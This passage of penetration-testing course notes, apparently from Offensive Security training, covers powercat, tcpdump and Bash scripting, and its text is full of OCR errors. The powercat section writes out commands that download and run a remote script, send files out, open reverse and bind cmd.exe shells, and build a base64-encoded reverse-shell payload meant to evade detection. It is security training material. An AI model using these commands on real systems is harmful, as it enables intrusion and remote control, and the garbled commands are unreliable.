   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.0.1
```



### Powercat

Download powercat

```
PS C:\Users\Offsec> iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
```

Now that our script is loaded, we can execute powercat as follows:

```
PS C:\Users\offsec> powercat
You must select either client mode (-c) or listen mode (-l).
```

#### Powercat File Transfers

First, we run a Netcat listener on Alice's computer:

```
kali@kali:~$ sudo nc -lvnp 443 > receiving_powercat.ps1
[sudo] password for kali: 
listening on [any] 443 ...
```

Next, we wlll invoke powercat on Bob's computer. The -c option speclfies client mode and sets
the listening IP address, -p specifies the port number to connect to, and -i indicates the local file
that will be transferred remotely:

```
PS C:\powercat> powercat -c 192.168.0.223 -p 443 -i C:\powercat\powercat.ps1
```

Finally, Alice wi ll kill the Netcat process and check that the file has been recelved:

```
^C
kali@kali:~$ ls receiving_powercat.psl
receiving_powercat.psl
```

#### Powercat Reverse Shells

We begin with the Netcat listener on Alice's machine:

```
kali@kali:~$ sudo nc -lvp 443
listening on [any] 443 ...
```

Next, Bob will use powercat to send a reverse shell. In this example. the -e option specifies the
application to execute (cmd.exe) once a connection is made to a listening port:

```
PS C:\Users\offsec> powercat -c 192.168.0.223 -p 443 -e cmd.exe
```

Finally, Alice's Netcat listener will receive the shell:

```
kali@kali:~$ sudo nc -lvp 443                          
listening on [any] 443 ...
192.168.0.198: inverse host lookup failed: Unknown host
connect to [192.168.0.223] from (UNKNOWN) [192.168.0.198] 51267
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```



#### Powercat Bind Shells

By contrast, a powercat bind shell is started on Bob's side with a powercat listener. We will use the
-t option to create a listener, -p to specify the listening port number, and -e to have an application
(cmd.exe) executed once connected:

```\
PS C:\Users\offsec> powercat -l -p 443 -e cmd.exe
```

Next. Alice will c reate a Netcat connection to the bind shell on Bob's computer:

```
kali @kali:-$ nc 192.168.0.198 443                                                          Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

#### Powercat Stand-Alone Payloads



```
kali @kali:-$ sudo nc -lnvp 443
listening on [any] 443 ...
```



Powercat can also generate stand-alone payloads. In the context of powercat, a payload is a set
of powershell instructions as well as the portion of the powercat script itself that only includes the
features requested by the user. Let's experiment with payloads in this next example.

After starting a listener on Alice's machine, we create a stand-alone reverse shell payload by adding
the -g option to the previous powercat command and redirecting the output to a file. This will
produce a powershell script that Bob can execute on his machine:

```
PS C:\powercat> powercat -c 192.168.0.223 -p 443 -e cmd.exe -g > reverseshell.ps1

PS C:\powercat> .\reverseshell.ps1
```

It's worth noting that stand-alone payloads li ke this one might be easily detected by IDS.
Specifically, the script that is generated is rather large with roughly 300 lines of code. Moreover, it
also contains a number of ha rdcoded strings that can easily be used in signatures for malicious
activity. While the identification of any specific signature is outside of scope of this module, it is
sufficient to say that plaintext malicious code such as this will likely have a poor success rate and
will likely be caught by defensive software solutions.

We can attempt to overcome this problem by making use of PowerShell's ability to execute Base64
encoded commands. To generate a stand-alone encoded payload, we use the -ge option and once
again redirect the output to a file:

```
PS C:\Users\offsec> powercat -c 10.11.0,4 -p 443 -e cmd.exe -ge > encodedreverseshett.
psl
```

The file w ill contain an encoded string that can be executed using the PowerShell -E
(EncodedCommand) option. However, since the -E option was designed as a way to submit
complex commands on the command line, the resulting encodedreverseshell.ps1 script can not be
executed in t he same way as our unencoded payload. Instead, Bob needs to pass the whole
encoded string to powershetl.exe -E:

- Open the encodedreverseshett.psl in notepad 
- Copy, paste and run the content

```
PS C: \Users\offsec> powershell.exe -E ZgB1AG4AVw88AGkAbwBuACAAUwB8AHIAZQBhAG8AMQBfAFM
AZQB8AHUAcAAKAHsACgAKACAAIAAgACAAcABhAHIAVQBtACgAJABGAHUAbgBjAFMAZQB0AHUAcABWAGEAcgBzA
CkACgAgACAAIAAgACQAVwAsACQAbAAsACQAcAAsACQAdAAgAD8AIAAkAEVAdQBuAGMAUwBtAHQAdQBwAFVAVQB
yAHMACgAgACAAIAAgAGkAZgAoACQAZwBsAGSAVgBhAGwAOgBWAGUAcgBiAGSAcwBtACkAewAkAFVAZQByAGIAb
wBzAGUAIAA9ACAAJABUAHIAdQBtAH8ACgAgACAAIAAgACQARgB1AG4AVwBWAGEAcgBzACAAPQAgAEAAewB9AAo
AIAAgACAAIABpAGVAKAAhACQAbAApAAoAIAAgACAAIAB7AAoAIAAgACAAIAAgACAAJABGAHUAbgBjAFVAVQByA
HMAWWAiAGwAigBdACAAPQAgACQARgBhAGwAcwBtAAoAIAAgACAAIAAgACAAJABTAG8AVwBrAGUAdAAgAD8AIAB
OAGUAdwAtAE8AVgBqAGUAVwB8ACAAUwBSAHMAdABtAG8ALgBOAGUAdAAuAFMAbwBjAGsAZQB8AHMALgBUAGMAc
ABDAGwAaQBtAG4AdAAKACAAIAAgACA
```

### Wireshark





### Tcpdump

Tcpdump  is a text-based network sniffer that is streamlined, powerful, and flexible despite the
lack of a graphical interface. It is by far the most commonly-used command-line packet analyzer
and can be found on most Unix and Linux operating systems, but local user permissions determine
the ability to capture network traffic.

```
kali@kali:~$ sudo tcpdump -r password_cracking_filtered.pcap
reading from file password_cracking_filtered.pcap, l i nk-type EN10MB (Ethernet)
08:51:20.800917 IP 208.68.234.99.60509 > 172.16.40.10.81: Flags [ SJ , seq 1855084074, w
in 14600, options [mss 1460,sackOK,TS val 25538253 ec r 0,nop,wscale 7], length 0
08:51:20.800953 IP 172.16.40.10.81 > 208.68.234.99.60509: Flags [S.J, seq 4166855389,
ack 1855084075, win 14480, options [mss 1460,sackOK,TS val 71430591 ecr 25538253,nop,w
scale 4], length 0
08:51:20.801023 IP 208.68.234.99.60509 > 172.16.40.10.81: Flags [ SJ , seq 1855084074, w
in 14600, options [mss 1460,sackOK,TS val 25538253 ecr 0,nop,wscale 7], length 0
08:51:20.801030 IP 172.16.40.10.81 > 208.68.234 .99.60509: Flags [S.], seq 4166855389,
ack 1855084075, win 14480, options [mss 1460,sackOK,TS val 71430591 ecr 25538253,nop,w
scale 4], length 0
08:51:20.801048 IP 208.68.234.99.60509 > 172.16.40.10.81: Flags [SJ , seq 1855084074, w
in 14600, options [mss 1460,sackOK,TS val 25538253 ecr 0,nop,wscale 7], length 0
08:51:20.801051 IP 172.16.40.10.81 > 208.68.234.99.60509: Flags [S.J, seq 4166855389,
ack 1855084075, win 14480, options [mss 1460,sackOK,TS val 71430591 ecr 25538253,nop,w
scale 4], length 0
```

#### Filtering Traffic

```
kali@kali: ~$ sudo tcpdump -n -r password_cracking_filtered.pcap | awk -F" " '{print $3}' | sort | uniq -c | head

12324	172.16.40.10.81
   18	208.68.234.99.32768
   18	208.68.234.99.32769
   18	208.68.234.99.32770
   18	208.68.234.99.32771
   18	208.68.234.99.32772
   18	208.68.234.99.32773
....
```

In order to filter from the command line, we w ill use the source host (src host) and destination
host (dst host) filters to output only source and destination traffic respectively. We can also filter
by port number (-n port 81) to show both source and destination traffic against port 87. Let's try
those filters now:

```
$ sudo tcpdump -n src host 172.16.48.18 -r password_cracking_filtered.pcap
08:51:20.801051 IP 172.16.40.10.81 > 208.68.234.99.60509: Flags [S. J , seq 4166855389,
ack 1855084075, win 14480, options [mss 1460,sackOK, TS val 71430591 ecr 25538253,nop,w
scale 4), length 0
08:51:20.802053 IP 172.16.40.10.81 > 208.68.234.99.60509: Flags [.], ack 89, win 905,
options [nop,nop,TS val 71430591 ecr 25538253] , length 0

$ sudo tcpdump -n dst host 172,16.48.10 -r password_cracking_filtered.pcap
08:51:20.801048 IP 208.68.234.99.60509 > 172.16.40.10.81: Flags [SJ , seq 1855084074, w
in 14600, options [mss 1460,sackOK,TS val 25538253 ecr 0,nop,wscale 7), length 0
08:51:20.802026 IP 208.68.234.99.60509 > 172.16.40.10.81: Flags [.], ack 4166855390, w
in 115, options [nop,nop,TS val 25538253 ecr 71430591], length 0

$ sudo tcpdump - n port 81 -r password_cracking_filtered.pcap
08:51:20.800917 IP 208.68.234.99.60509 > 172.16.40.10.81: Flags [SJ , seq 1855084074, w
in 14600, options [mss 1460,sackOK, TS val 25538253 ecr 0,nop,wscale 7), length 0
08:51:20.800953 IP 172.16.40.10.81 > 208.68.234.99.60509: Flags [S.], seq 4166855389,
ack 1855084075, win 14480, options [mss 1460,sackOK,TS val 71430591 ecr 25538253,nop,w
scale 4), length 0
```


To dump the captured traffic, we will use the ASCll 108 format: -X option to print the packet data in both HEX and ASCII format:

```
kali@ka1i:-$ sudo tcpdump -nX -r password_cracking_filtered.pcap
reading from file sample.pcap, link-type EN10MB (Ethernet)
14:29:06.244202 IP 192.168.1.105.55261 > 192.168.1.2.53: 42559+ A? www.metasploit.com. (36)
	0x0000:  4500 0040 22b4 0000 8011 943d c0a8 0169  E..@"......=...i
	0x0010:  c0a8 0102 d7dd 0035 002c 8bf8 a63f 0100  .......5.,...?..
	0x0020:  0001 0000 0000 0000 0377 7777 0a6d 6574  .........www.met
	0x0030:  6173 706c 6f69 7403 636f 6d00 0001 0001  asploit.com.....
14:29:06.305998 IP 192.168.1.2.53 > 192.168.1.105.55261: 42559 1/0/0 A 216.75.1.230 (52)
	0x0000:  4500 0050 58f6 0000 3f11 9eeb c0a8 0102  E..PX...?.......
	0x0010:  c0a8 0169 0035 d7dd 003c 70d6 a63f 8180  ...i.5...<p..?..
	0x0020:  0001 0001 0000 0000 0377 7777 0a6d 6574  .........www.met
	0x0030:  6173 706c 6f69 7403 636f 6d00 0001 0001  asploit.com.....
	0x0040:  c00c 0001 0001 0000 003c 0004 d84b 01e6  .........<...K..
14:29:06.315134 IP 192.168.1.105 > 216.75.1.230: ICMP echo request, id 1, seq 3, length 40
	0x0000:  4500 003c 22b5 0000 8001 7bc9 c0a8 0169  E..<".....{....i
	0x0010:  d84b 01e6 0800 4d58 0001 0003 6162 6364  .K....MX....abcd
	0x0020:  6566 6768 696a 6b6c 6d6e 6f70 7172 7374  efghijklmnopqrst
	0x0030:  7576 7761 6263 6465 6667 6869            uvwabcdefghi
```

#### Advanced Header Filtering

## Bash Scripting

```
kali@kali:~$ cat ./hello-world.sh
#!/bin/bash
# Hello World Bash Script
echo "Hello World!"
```

This script has several components worth explaining:

- Line 1: #! is commonly known as the shebang, 111 and is ignored by the Bash interpreter. The
  second part,Jbin/bash, is the absolute path 112 to the interpreter, which is used to run the
  script. This is what makes this a ·sash script" as opposed to another type of shell script, like
  a ·c Shell script", for example.

- Line 2: # is used to add a comment, so al l text that follows it is ignored.

- Line 3: echo ·Hello World uses the echo Linux command utility to print a given string to the
  terminal, which in this case is "Hello World!".

  

Next, let's make the script executable and run it

```
kali@kali:~$ chmod +x hello-world.sh
kali@kali:~$ ./hello-world.sh
Hello World!
```

### Variables

Variables are named places to temporarily store data. We can set (or "declare") a variable, which
assigns a value to it, or read a variable. which will "expand" or ·resolve· it to its stored value.

We can declare variable values in a number of ways. The easiest method is to set the value directly
with a simple name=vafue declaration. Notice that there are no spaces before or after the "=" sign:

```
kali@kali:~$ first_name=Good
kali@kali:~$ last_name=Hacker
kali @kali: ~$ echo $first.name $last.name
Good Hacker
```

This was not necessarily what we expected.To fix this, we can use either single quotes (') or double
quotes ( 11) to enclose our text. However, Bash treats single and double quotes differently. When
encountering single quotes, Bash interprets every enclosed character literally. When enclosed in
double quotes, all characters are viewed literally except "$'', '"", and "\" meaning variables will be
expanded in an initial substitution pass on the enclosed text.
A simple example will help clarify this:

```
kali @kali:~$ greeting='Hello World'

kali@kali:~$ echo $greeting
Hello World

kali@kali:~$ greeting2="New $greeting"

kali@kali:~$ echo $greeting2
New Hello World
```

We can also set the value of the variable to the result of a command or program. This is known as
command substitution,  which allows us to take the output of a command or program (what
would normally be printed to the screen) and have it saved as the value of a variable.

To do this, place the variable name in parentheses"()", preceded by a"$" character:

```
kali@kali:~$ user=$(whoami)

kali@kali:~$ echo $user
kali
```

It is also important to note that command substitution happens in a subshell and changes to va riables in the subshel l will not alter variables from the master process. This is demonstrated in the following example:

```
kali@kali :~$ cat ./subshell.sh
#!/bin/bash -x

var1=value1
echo $var1

var2=value2
echo $var2

$(var1=newvar1)
echo $var1

'var2=newvar2'
echo $var2

kali@kali:~$ ./subshell.sh
var1=value1
+ echo value1
value1
+ var2=value2
+ echo value2
value2
++ var1=newvar1
+ echo value1
value1
++ var2=newvar2
+ echo value2
value2
kali@kali : ~$
```

In this example, first note that we changed the shebang, adding in the-x flag. This instructed Bash
to print additional debug output. so we could more easily see the commands that were executed
and their results. As we view this output. notice that commands preceded with a single·+· character
were executed in the current shell and commands preceded with a double"++· were executed in a
subshell.

This allows us to clearly see that the second declaratf ons of var7 and var2 happened inside a
subshell and did not change the values in the current shell as the initial declarations did.

### Arguments

Not all Bash scripts require arguments. 117 However, it is extremely important to understand how
they are interpreted by Bash and how to use them. We have already executed Linux commands
with arguments. For example, when we run the command ls -l /var/log, both-land /var/log
are arguments to the ls command.

Bash scripts are no different; we can supply command-line arguments and use them in our scripts:

```
kali@kali:~$ cat ./arg.sh
#!/bin/bash
echo "The first two arguments are $1 and $2"

kali@ka1i:~$ chmod +x ./arg.sh

kali@kali:~$ ./arg.sh hello there
The first two arguments are hello and there
```

**Special shell variables**

| Variable  | Description                                      |
| :-------: | :----------------------------------------------- |
|    $0     | The name of the Bash script                      |
|  $1 -$9   | The first 9 arguments to the Bash script         |
|    $#     | Number of arguments passed to the Bash script    |
|    $@     | All arguments passed to the Bash script          |
|    $?     | The exit status of the most recently run process |
|    $$     | The process ID of the current script             |
|   $USER   | The username of the user running the script      |
| $HOSTNAME | The hostname of the machine                      |
|  $RANDOM  | A random number                                  |
|  $UNENO   | The current line number in the script            |

### Reading User Input

Command-line arguments are a form of user input, but we can also capture interactive user input
while a script is running with the read command. In this example, we will use read to capture user
input and assign it to a variable:

```
kali @kali:~$ cat ./input.sh
#!/bin/bash

echo "Hello there, would you like to learn how to hack: Y/N?"

read answer

echo "Your answer was $answer"

kali@kali:~$ chmod +x ./input.sh

kali@kali:~$ ./input.sh
Hello there, would you like to learn how to hack: Y/N?
Y
Your answer was Y
```

We can alter the behavior of the read command with various command line options. Two of the
most commonly used options include -p, which allows us to specify a prompt, and -s. which makes
the user input silent. The latter is ideal for capturing user credentials:

```
kali@kali: -$ cat ./input2.sh
#!/bin/bash
# Prompt the user for credentials

read -p ' Username: ' username
read -sp 'Password: ' password

echo "Thanks, your creds are as follows: "$username" and" $password

kali@kali:-$ chmod +x ./input2.sh

kali@kali: -$ ./input2.sh
Username: kali
Password:
Thanks, your creds are as follows: kali and nothing2see!
```



### If, Else, Elif Statements

Conditional statements allow us to perform different actions based on different conditions. The
most common conditional Bash statements include if, else, and elif.

The if statement is relatively simple-it checks to see if a condition is true-but lt requires a very
specific syntax. Pay careful attention to this syntax, especially the use of required spaces:

```
if [<some test>]
then
	<perform an action>
fi
```

```
kali@kali:-$ cat ./if.sh
#!/bin/bash
# if statement example

read -p "What is your age: "age

if [ $age -lt 16 ]
then
	echo "You might need parental permission to take this course!"
fi

kali@kali:-$ chmod +x ./if.sh

kali@kali:~$ ./if.sh
What is your age: 15
You might need parental permission to take this course!
```

Some of the most common operators include:

|       Operator        | Description                                    |
| :-------------------: | :--------------------------------------------- |
|      !EXPRESSION      | The EXPRESSION is false.                       |
|       -n STRING       | STRING length is greater than zero             |
|       -zSTRING        | The lenath of STRING is zero (empty)           |
|  STRING1 != STRING2   | STRING1 is not eQual to STRING2                |
|   STRING1 = STRING2   | STRING1 is eaual to STRING2                    |
| INTEGER1 -eq INTEGER2 | INTEGER1 is equal to INTEGER2                  |
| INTEGER1 -ne lNTEGER2 | INTEGER1 is not equal to INTEGER2              |
| INTEGER1-gt lNTEGER2  | INTEGER1 is greater than INTEGER2              |
| INTEGER1 -It INTEGER2 | INTEGER1 is less than lNTEGER2                 |
| INTEGER1 -ge INTEGER2 | INTEGER1 is greater than or equal to INTEGER 2 |
| INTEGER1 -le INTEGER2 | INTEGER1 is less than or equal to INTEGER 2    |
|        -d FILE        | FILE exists and is a directory                 |
|        -e FILE        | FILE exists                                    |
|        -r FILE        | FILE exists and has read permission            |
|        -s FILE        | FILE exists and it is not emotv                |
|        -w FILE        | FILE exists and has write permission           |
|        -x FILE        | FILE exists and has execute permission         |

We can also perform a certain set of actions if a statement is true and another set if it is false. To
do this, we can use the else statement, which has the following syntax:

```
if [ <some test> J
then
	<perform action>
else
	<perform another action>
fi
```

Let's extend our previous ·age· example to include the else statement:

```
kali@kali: ~$ cat ./else.sh
#!/bin/bash
# else statement example

read -p "What is your age: "age

if [ $age -lt 16 ]
then
	echo "You might need parental permission to take this course!"
else
	echo "Welcome to the course!"
fi

kali@kali:~$ chmod +x ./else.sh

kali@kali:~$ ./else.sh
What is your age: 21
Welcome to the course!
```

The if and else statements only allow two code execution branches. We can add addit ional
branches with the elif statement which uses the following pattern:

```
if [ <some test>]
then
	<perform action>
elif [ <some test>]
then
	<perform different action>
else
	<perform yet another different action>
fi
```

```
kali@kali: ~$ cat ./elif.sh
#!/bin/bash
# elif example

read -p "What is your age:" age
if [ $age -lt 16 ]
then
	echo "You might need parental permission to take this course!"
elif [ $age -gt 60 ]
then
	echo "Hats off to you, respect!"
else
	echo "Welcome to the course!"
fi

kali@kali:-$ chmod +x ./elif.sh

kali@kali:~$ ./elif.sh
What is your age: 65
Hats off to you, respect!
```

### Boolean Logical Operations

Boolean logical operators, like AND (&&) and OR (II) are somewhat mysterious because Bash
uses them in a variety of ways.

One common use is in command lists, which are chains of commands whose flow is controlled by
operators. The T (pipe) symbol is a commonly-used operator in a command list and passes the
output of one command to the input of another. Similarly, boolean log ical operators execute
commands based on whether a previous command succeeded (or returned True or 0) or failed
(returned False or non-zero).

Let's take a look at the AND (&&) boolean operator first, which executes a command only if the
previous command succeeds (or returns True or 0):

```
kali@kali:~$ user2=kali

kali@kali:~$ grep $user2 /etc/passwd && echo "$user2 found!"
kali:x:1000:1000:,,,:/home/kali:/bin/bash
kali found!

kali@kali:~$ user2=bob

kali@kali:-$ grep $user2 /etc/passwd && echo "$user2 found!"
```

In this example, we first assigned the username we are searching for to the user2 variable. Next,
we use the grep command to check if a certain user is listed in the /etc/passwd file, and if it is,
grep returns True and the echo command is executed. However, when we try searching for a user
that we know does not exist in the /etc/passwd file, our echo command is not executed.

When used in a command list the OR (II) operator is the opposite of AND(&&); it executes the next
command only if the previous command failed (returned False or non-zero):

```
kali@kali:-S echo $user2
bob
kali@kali:~$ grep $user2 /etc/passwd && echo "$user2 found!" || echo "$user2 not found! "
bob not found!
```

These operators can also be used in a test to compare variables or the results of other tests. When
used this way, AND (&&) combines two simple conditions. and if they are both true, the combined
result is success (or True or O).

Consider this example:

```
kali@kali:~$ cat ./and.sh
#/bin/bash
# and example

if [ $USER == 'kali' ] && [ $HOSTNAME == 'kali' ]
then
	echo "Multiple statements are true!"
else
	echo "Not much to see here ... "
fi

kali@kali:~$ chmod +x ./and.sh

kali@kali:~$ ./and.sh
Multiple statements are true!

kali@kali:~$ echo $USER && echo $HOSTNAME
kali
kali
```

When used in a test the OR (II) boolean operator is used to test one or more conditions, but only
one of them has to be true to count as success.

Let's take a look at an example:

```
kali@kali:~$ cat ./or.sh
#!/bin/bash
# or example

if [ $USER== 'kali' ] || [ $HOSTNAME == 'pwn' ]
then
	echo "One condition is true, this line is printed"
else
	echo "You are out of luck!"
fi

kali@kali:~$ chmod +x ./or.sh

kali@kali:~$ ./or.sh
One condition is true, this line is printed

kali@kali:~$ echo $USER && echo $HOSTNAME
kali
kali
```



### For Loops

```
for var-name in <list>
do
	<action to perform>
done
```

```
kali@kali:-$ for ip in $(seq 1 10); do echo 192.168.1.$ip; done
192.168.1.1
192.168.1.2
192.168.1.3
192.168.1.4
192.168.1.5
192.168.1.6
192.168.1.7
192.168.1.8
192.168.1.9
192.168.1.10

# OR

kali@kali:-$ for ip in {1..10}; do echo 192.168.1.$ip; done                                192.168.1.1
192.168.1.2
192.168.1.3
192.168.1.4
192.168.1.5
192.168.1.6
192.168.1.7
192.168.1.8
192.168.1.9
192.168.1.10
```

### While Loops

While loops are also fairly common and execute code while an expression is true. While loops have
a simple format and, like if, use the square brackets ([]) for the test:

```
while [ <some test>]
do
	<perform an action>
done
```

```
kali @kali:-$ cat ./while.sh
#!/bin/bash
# while loop example

counter=l

while [ $counter -lt 10 ]
do
	echo "10.11.l.$counter"
	((counter++))
done

kali@kali:-$ chmod +x while.sh

kali@kali:-$ ./while.sh
10.11.1.1
10.11.1.2
10.11.1.3
10.11.1.4
10.11.1.5
10.11.1.6
10.11.1.7
10.11.1.8
10.11.1.9
```

```
kali @kali:-$ cat ./while2.sh
#!/bin/bash
# while loop example

counter=l

while [ $counter -lt 10 ]
do
	echo "10.11.l.$counter"
	((counter++))
done

kali@kali:-$ chmod +x while2.sh

kali@kali:-$ ./while2.sh
10.11.1.1
10.11.1.2
10.11.1.3
10.11.1.4
10.11.1.5
10.11.1.6
10.11.1.7
10.11.1.8
10.11.1.9
```

### Functions

In terms of Bash scripting, we can think of a function as a script within a script, which is useful
when we need to execute the same code multiple times in a script. Rather than re-writing the same
chunk of code over and over, we just write it once as a function and then call that function as
needed.

Put another way, a function is a subroutine, or a code block that implements a set of operations-a
Nblack box· that performs a specified task. Functions may be written in two different formats. The
first format is more common to Bash scripts:

```
function function_name {
commands ...
}
```

The second format is more familiar to C programmers:

```
function_name () {
commands ...
}
```

The formats are functionally identical and are a matter of personal preference. Let's look at a simple
example:

```
kali@kali:~$ cat ./func.sh
#!/bin/bash
# function example
print_me () {
	echo "You have been printed!"
}

print_me

kali@ka1i:~$ chmod +x ./func.sh

kali@kali:~$ ./func.sh
You have been printed!
```

Functions can also accept arguments:

```
kal i@kali:~$ cat ./funcarg.sh
#!/bin/bash
# passing arguments to functions

pass_arg() {
	echo "Today's random number is: $1" 
}

pass_arg $RANDOM

kali@kali:~$ chmod +x ./funcarg.sh

kali@kali:~$ ./funcarg.sh
Today's random number is: 25207
```

In addition to passing arguments to Bash functions, we can of course return values from Bash
functions as well. Bash functions do not actually allow you to return an arbitrary value in the
traditional sense. Instead, a Bash function can return an exit status (zero for success, non-zero for
failure) or some other arbitrary value that we can later access from the $? global variable ( see Table
4). Alternatively, we can set a global variable inside the function or use command substitution to
simulate a traditional return.
Let's look at a simple example that returns a random number into$?:

```
kali@kali:~$ cat funcrvalue.sh
#!/bin/bash
# function return value sample

return_me() {
	echo "Oh hello there, I'm returning a random value!"
	return $RANDOM
}
return_me
echo "The previous function returned a value of $? "

kali@kali:~$ chmod +x ./funcrvalue.sh

kali@kali:~$ ./funcrvalue.sh
Oh hello there, I'm returning a random value!
The previous function returned a value of 198

kali@kali:~$ ./funcrvalue . sh
Oh hello there, I'm returning a random value!
The previous function returned a value of 313
```

Now that we have a basic understanding of variables and functions, we can dig deeper and discuss
variable scope. 

The scope of a variable is simply the context in which it has meaning. By default, a variable has a
global scope, meaning it can be accessed throughout the entire script. In contrast, a local variable
can only be seen within the function, block of code, or subshell in which it is defined. We can
#overlay" a global variable, giving it a local context, by preceding the declaration with the local
keyword, leaving the global variable untouched. The general syntax is:

Let's see how local and global variables work in practice with a simple example:

```
kali@kali:~$ cat ./varscope.sh
#!/bin/bash
# varscope example

name1="John"
name2="Jason"

name_change() {
	local name1="Edward"
	echo "Inside of this function, name1 is $name1 and name2 is $name2"
   	name2="Lucas"
}

echo "Before the function call, name1 is $name1 and name2 is $name2"

name_change

echo "After the function call, name1 is $name1 and name2 is $name2"

kali@kali:~$ chmod +x varscope.sh

kali@kali:~$ ./varscope.sh
Before the function call, name! is John and name2 is Jason
Inside of this function, namel is Edward and name2 is Jason
After the function call, name! is John and name2 is Lucas
```

### Practical Examples

#### Practical Bash Usage - Example 1

In this example, we want to find all the subdomains listed on the main megacorpone.com web page
and find their corresponding IP addresses. Doing this manually would be frustrating and time
consuming, but with some basic Bash commands, we can turn this into an easy task. We'll start by
downloading the index page w ith wget:

```
kali @kali:~$ wget www.megacorpone.com                                                                                     
--2020-12-03 01:59:14--  http://www.megacorpone.com/
Resolving www.megacorpone.com (www.megacorpone.com)... 3.220.87.155
Connecting to www.megacorpone.com (www.megacorpone.com)|3.220.87.155|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 14603 (14K) [text/html]
Saving to: ‘index.html’

index.html                        100%[============================================================>]  14.26K  57.3KB/s    in 0.2s    

2020-12-03 01:59:15 (57.3 KB/s) - ‘index.html’ saved [14603/14603]

kali @kali:~$ ls -l index.html 
-rw-r--r-- 1 kali kali 14603 Nov  6  2019 index.html
```

Manually scanning the file, we see many lines we don't need. Let's start narrowing in on lines that
we need, and strip out lines we don't. First. we can use grep "href=" to extract all the lines in
index.html that contain HTML links:

```
kali @kali:~$ grep "href=" index.html                                                         <link rel="shortcut icon" href="assets/ico/favicon.ico">
    <link href="assets/css/bootstrap.css" rel="stylesheet">
    <link href="assets/css/style.css" rel="stylesheet">
    <link href="assets/css/font-awesome.min.css" rel="stylesheet">
                <a class="navbar-brand" href="index.html">MegaCorp One</a>
                    <li class="active"><a href="//www.megacorpone.com/index.html">HOME</a></li>
                    <li><a href="https://www.megacorpone.com/about.html">ABOUT</a></li>
                    <li><a href="/contact.html">CONTACT</a></li>
                    <li><a href="http://support.megacorpone.com">SUPPORT</a></li>
                    <!--<li><a href="https://www.offensive-security.com/offensive-security-solutions/virtual-penetration-testing-labs/">SUPPORT</a></li>-->
                    <li><a href="http://www.megacorpone.com/jobs.html">CAREERS</a></li>
                    <!--<li><a href="http://www.megacorpone.com/jobs2.html">CAREERS</a></li>-->
                    <li><a href="http://intranet.megacorpone.com">LOG IN</a></li>
                    <!--<li><a href="https://cp.megacorpone.net/">LOG IN</a></li>-->
                    <p><br/><a href="about.html" class="btn btn-theme">More Info</a></p>
                    <p><br/><a href="about.html" class="btn btn-theme">More Info</a></p>
                    <p><br/><a href="about.html" class="btn btn-theme">More Info</a></p>
                    <li><a href="http://admin.megacorpone.com/admin/index.html">Cell Regeneration</a></li>
                    <li><a href="http://intranet.megacorpone.com/pear/">Immune Systems Supplements</a></li>
                    <li><a href="http://mail.megacorpone.com/menu/">Micromachine Cyberisation Repair</a></li>
                    <li><a href="http://mail2.megacorpone.com/smtp/relay/">Nanomite Based Weaponry Systems</a></li>
                    <li><a href="http://siem.megacorpone.com/home/">Nanoprobe Based Entity Assimilation</a></li>
                    <li><a href="http://support.megacorpone.com/ticket/requests/index.html">Nanoprocessors</a></li>
                    <li><a href="http://syslog.megacorpone.com/logs/sys/view.php">Perlin VanHook Chemical Dispersal</a></li>
                <p><br/><a href="about.html" class="btn btn-theme">More Info</a></p>
                    <li><a href="http://test.megacorpone.com/demo/index.php">What are the ethics behind MegaCorp One?</a></li>
                    <li><a href="http://vpn.megacorpone.com/diffie-hellman/">Is MegaCorp One being regulated by any goverment?</a></li>
                    <li><a href="http://www.megacorpone.com/aboutus.html">Where can I buy MegaCorp One products?</li>
    	 			<li><a href="http://www2.megacorpone.com/test/newsite/index.php">Is there any environmental concerns related to nanotechnology?</a></li>
                    <li><a href="http://www2.megacorpone.com/test/newsite/index.php">Can I suggest nanotechnology uses for the company to explore?</a></li>
                    <li><a href="http://www2.megacorpone.com/test/newsite/index.php">What are the specs behind MegaCorpOne nanoprocessors?</a></li>
                <p><a href="http://admin.megacorpone.com/news/today.php">MegaCorp One acquires new round of funding.</a></p>
                <p><a href="http://beta.megacorpone.com/util/files/news.html">Lawsuit against MegaCorp One is dropped when plaintiffs go missing.</a></p>
                <p><a href="http://beta.megacorpone.com/util/files/news.html">MegaCorp One CEO Joe Sheer nominated for Nobel Physics, Medicine, and Literature prizes.</a></p>
                    <p><small>This is a fictitious company, brought to you by <a href="https://www.offensive-security.com/" target="_blank">Offensive Security</a>.</small></p>
                        <a href="https://www.facebook.com/MegaCorp-One-393570024393695/" target="_blank"><i class="fa fa-facebook"></i></a>
                        <a href="https://twitter.com/joe_sheer/"><i class="fa fa-twitter"></i></a>
                        <a href="https://www.linkedin.com/company/18268898/" target="_blank"><i class="fa fa-linkedin"></i></a>
                        <a href="https://github.com/megacorpone" target="_blank"><i class="fa fa-github"></i></a>

```

In the excerpt above, the first line is a prime example of what we're looking for as it references a
subdomain.

Let's use grep to grab lines that contain ·.megacorpone", indicating the existence of a subdomain,
and grep -v to strip away lines that contain the boring "www.megacorpone.com" domain we
already know about:

```
kali @kali:~$ grep "href=" index.html | grep "\.megacorpone" | grep -v "www\megacorpone\.com" | head
                    <li class="active"><a href="//www.megacorpone.com/index.html">HOME</a></li>
                    <li><a href="https://www.megacorpone.com/about.html">ABOUT</a></li>
                    <li><a href="http://support.megacorpone.com">SUPPORT</a></li>
                    <li><a href="http://www.megacorpone.com/jobs.html">CAREERS</a></li>
                    <!--<li><a href="http://www.megacorpone.com/jobs2.html">CAREERS</a></li>-->
                    <li><a href="http://intranet.megacorpone.com">LOG IN</a></li>
                    <!--<li><a href="https://cp.megacorpone.net/">LOG IN</a></li>-->
                    <li><a href="http://admin.megacorpone.com/admin/index.html">Cell Regeneration</a></li>
                    <li><a href="http://intranet.megacorpone.com/pear/">Immune Systems Supplements</a></li>
                    <li><a href="http://mail.megacorpone.com/menu/">Micromachine Cyberisation Repair</a></li>
```

This output looks closer to what we need. By reducing our data in a logical way and making
sequentially smaller reductions with each pass, we are in the midst of the most common cycle in
data handling.

It looks like each line contains a link, and a subdomain, but we need to get rid of the extra HTML
around our links. There are always multiple approaches to any task performed in Bash, but we'll
use a little-known one for this. We will use the -F option of awk to set a multi-character delimiter,
unlike cut, which is simple and handy but only allows single-character delim iters. We w ill set our
